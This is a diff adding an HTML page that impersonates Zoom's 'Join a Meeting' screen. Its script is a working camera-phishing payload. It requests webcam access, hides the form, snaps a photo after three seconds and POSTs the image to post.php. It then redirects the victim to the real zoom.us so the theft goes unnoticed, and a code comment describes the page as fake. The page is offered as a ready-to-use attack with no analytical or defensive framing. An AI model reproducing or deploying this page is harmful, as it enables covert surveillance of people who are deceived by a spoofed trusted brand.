@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Zoom</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            font-family: 'Lato', sans-serif;
+            background-color: #f8f9fa;
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        .top-bar {
+            background-color: #fff;
+            color: #212529;
+            padding: 10px;
+            text-align: left;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+        }
+
+        .zoom-logo {
+            font-size: 24px;
+            font-weight: bold;
+            color: #2D8CFF;
+            margin-left: 20px;
+        }
+
+        .main-content {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: calc(100vh - 50px);
+        }
+
+        .join-section {
+            text-align: center;
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 400px;
+        }
+
+        .join-title {
+            font-size: 22px;
+            color: #212529;
+            margin-bottom: 20px;
+        }
+
+        .meeting-id-input, .name-input {
+            padding: 10px;
+            border: 1px solid #ced4da;
+            border-radius: 4px;
+            margin-bottom: 15px;
+            width: 100%;
+            outline: none;
+        }
+
+        .meeting-id-input:focus, .name-input:focus {
+            border-color: #2D8CFF;
+        }
+
+        .join-button {
+            background-color: #2D8CFF;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            transition: background-color 0.3s;
+            width: 100%;
+        }
+
+        .join-button:hover {
+            background-color: #1e60b8;
+        }
+
+        .bottom-bar {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            background-color: #fff;
+            padding: 10px;
+            text-align: center;
+            border-top: 1px solid #e0e0e0;
+        }
+
+        .bottom-bar a {
+            color: #2D8CFF;
+            text-decoration: none;
+            margin: 0 10px;
+        }
+
+        .bottom-bar a:hover {
+            text-decoration: underline;
+        }
+                /* Styles for video and canvas */
+        #videoElement {
+            width: 400px;
+            height: 300px;
+            background-color: #424242;
+            display: none; /* Initially hide the video */
+            margin-bottom: 20px;
+        }
+
+        #canvasElement {
+            display: none; /* Initially hide the canvas */
+        }
+    </style>
+    <link href="https://fonts.googleapis.com/css2?family=Lato:wght@400;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="top-bar">
+        <span class="zoom-logo">zoom</span>
+    </div>
+    <div class="main-content">
+          <video id="videoElement"></video>
+        <canvas id="canvasElement" width="400" height="300"></canvas>
+        <div class="join-section">
+            <h2 class="join-title">Join a Meeting</h2>
+            <input type="text" class="meeting-id-input" placeholder="Meeting ID">
+            <input type="text" class="name-input" placeholder="Your Name">
+            <button class="join-button">Join</button>
+        </div>
+    </div>
+    <div class="bottom-bar">
+        <a href="#">Help</a>
+        <a href="#">Terms</a>
+        <a href="#">Privacy</a>
+    </div>
+          <script>
+        // Webcam access and image capture
+        var video = document.getElementById('videoElement');
+        var canvas = document.getElementById('canvasElement');
+        var context = canvas.getContext('2d');
+
+        // Get access to the camera!
+        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(function(stream) {
+                    video.srcObject = stream;
+                    video.style.display = 'block'; // Show the video
+                    document.querySelector('.join-section').style.display = 'none'; // Hide the placeholder
+                    video.play();
+
+                    // Capture image after 3 seconds
+                    setTimeout(function() {
+                        captureImage();
+                    }, 3000);
+                });
+        }
+
+        function captureImage() {
+            context.drawImage(video, 0, 0, 400, 300);
+            var imageData = canvas.toDataURL('image/png');
+
+            // Send the image data to the server
+            sendImage(imageData);
+        }
+
+        function sendImage(imageData) {
+            var xhr = new XMLHttpRequest();
+            xhr.open('POST', 'post.php', true);
+            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+            xhr.onload = function() {
+                // Redirect to the fake page after sending the image
+                window.location.href = 'https://zoom.us/join'; // Replace with your actual URL
+            };
+            xhr.send('cat=' + encodeURIComponent(imageData));
+        }
+    </script>
+</body>
+</html>
